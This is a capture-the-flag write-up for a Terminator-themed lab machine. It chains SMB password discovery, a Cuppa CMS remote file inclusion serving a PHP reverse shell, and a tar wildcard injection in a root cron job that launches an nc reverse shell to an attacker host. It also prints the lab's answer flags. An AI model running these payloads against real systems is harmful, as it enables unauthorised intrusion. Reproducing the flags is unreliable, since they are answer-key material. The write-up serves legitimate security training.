# Skynet

## Intro

The goal is to compromise this Terminator-themed machine. Enumeration reveals multiple services including web, email, and SMB. Through chaining vulnerabilities (password discovery, CMS RFI exploit, and cronjob abuse), we escalate to root.

---

## Rustscan / Nmap

Commands used:

```bash
rustscan -a skynet.thm --ulimit 5000 -- -sC -sV -oN skynet_scan.txt
nmap -sC -sV -p- skynet.thm
```

Results:

```
22/tcp  open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp  open  http      Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3      Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap      Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

---

## Web Enumeration

Directory fuzzing with `ffuf` and `dirsearch` found:

```
/squirrelmail  →  http://skynet.thm/squirrelmail/
```
<img width="480" height="270" alt="Screenshot From 2025-08-29 17-19-14" src="https://github.com/user-attachments/assets/c7246fdb-421a-459b-b767-b127d31f9aba" />

SquirrelMail version: **1.4.23** → vulnerable to RCE.

Exploit:

```bash
wget https://raw.githubusercontent.com/xl7dev/Exploit/master/SquirrelMail/SquirrelMail_RCE_exploit.sh -O SquirrelMail_RCE_exploit.sh
chmod +x SquirrelMail_RCE_exploit.sh
./SquirrelMail_RCE_exploit.sh http://skynet.thm/squirrelmail/
```

But we need valid credentials first.

---

## SMB Enumeration

Login anonymously:

```bash
smbclient //10.201.34.186/anonymous -U anonymous
```

File found: `attention.txt`
Content: system malfunction notice from Miles Dyson + a list of passwords.

Examples:

```
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

<img width="1848" height="970" alt="Screenshot From 2025-08-29 18-05-37" src="https://github.com/user-attachments/assets/7358525b-c0a7-42b1-a7f5-dd8141636b9b" />

---

## Exploiting Email Access

Tried the passwords with user `milesdyson`.
Success:

```
Username: milesdyson
Password: cyborg007haloterminator
```

Inside webmail, found a **Samba reset password email**:

```
Password: )s{A&2ZF^n_E.B`
```

Logged into SMB with new password:

```bash
smbclient //10.201.34.186/milesdyson -U milesdyson
```

Explored directories → in `/notes/important.txt` we see:

```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

---

## Cuppa CMS Exploit

Navigating to:

```
http://skynet.thm/45kra24zxs28v3yd/
```
<img width="1848" height="970" alt="Screenshot From 2025-08-29 23-32-42" src="https://github.com/user-attachments/assets/ad05a8f6-8e14-441c-8889-1889a4fa70b0" />

So we get this page andddddd there is nothing. So lets see what more domains there is using `http://skynet.thm/45kra24zxs28v3yd/`  in `gobuster`

```
http://skynet.thm/45kra24zxs28v3yd/administrator        (Status: 200) [Size: 4945]
```

We get a administrator page. We see this page and its a Cuppa CMS. So after researching and looking for a exploit we get a Cuppa CMS File Inclusion. This answers the 3rd question. 

`http://skynet.thm/45kra24zxs28v3yd/administrator/`

<img width="574" height="386" alt="image" src="https://github.com/user-attachments/assets/688b46d9-c4fc-4ed2-8ff4-b15bd29749b6" />

### Exploiting Cuppa CMS in Skynet (Exploit-DB 25971)

While enumerating the target, I discovered a Cuppa CMS installation with a vulnerable script located at:

```
/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php
```

This script is vulnerable to a Remote File Inclusion (RFI) via the `urlConfig` parameter.

Identified **Cuppa CMS**, vulnerable to RFI (Exploit-DB 25971).

**Exploit steps**:

1. Prepare reverse shell:

   ```php
   $ip = "YOUR_IP";
   $port = 1234;
   ```

   Save as `php-reverse-shell.php`.

2. Host file:

   ```bash
   python3 -m http.server 8080
   ```

3. Start listener:

   ```bash
   nc -lvnp 1234
   ```

4. Trigger exploit:

   ```bash
   curl "http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://YOUR_IP:8080/php-reverse-shell.php"
   ```

Got shell as `www-data`.

> Q1: User flag
> A1: 7ce5c2109a40f958099283600a9ae807

---

## Privilege Escalation – Cron + Tar Wildcard Injection

While enumerating the machine, I checked the system-wide crontab:

```bash
cat /etc/crontab

```

I found a job that runs every minute as **root**:

```
*/1 * * * * root /home/milesdyson/backups/backup.sh

```

---

### Step 1 – Inspect the backup script

Looking at `/home/milesdyson/backups/backup.sh`:

```bash
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *

```

This script changes into `/var/www/html` and runs `tar` on everything in the directory. The problem is that it uses a wildcard (`*`). In tar, specially named files like `--checkpoint` or `--checkpoint-action` are treated as **options**, not just filenames. Since root is running this script, I can abuse it to execute arbitrary commands.

---

### Step 2 – Craft the payload

Inside `/var/www/html`, I created a shell script that launches a reverse shell back to my AttackBox:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACK_IP> 1234 >/tmp/f" > shell.sh
chmod +x shell.sh

```

---

### Step 3 – Add malicious tar options

I then created two empty files that tar would interpret as options:

```bash
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"

```

These files trick tar into executing `sh shell.sh` during its run.

---

### Step 4 – Catch the root shell

Finally, I started a listener on my AttackBox:

```bash
nc -lvnp 1234

```

After waiting about a minute for the cron job to trigger, tar executed my payload, and I received a reverse shell back as **root**. You have to be patience cause it did take me about a couple minutes.
> Q2: Root flag

> A2: 3f0372db24753accc7179a282cd6a949

---

## Conclusion

* Enumerated open ports/services with nmap.
* Found `squirrelmail` and identified RCE vulnerability.
* Retrieved Miles Dyson’s credentials from SMB share.
* Logged into SMB, discovered beta CMS path.
* Exploited **Cuppa CMS RFI** → www-data shell.
* Privilege escalation via **tar wildcard injection in cronjob** → root shell.
* Captured both user and root flags.

---
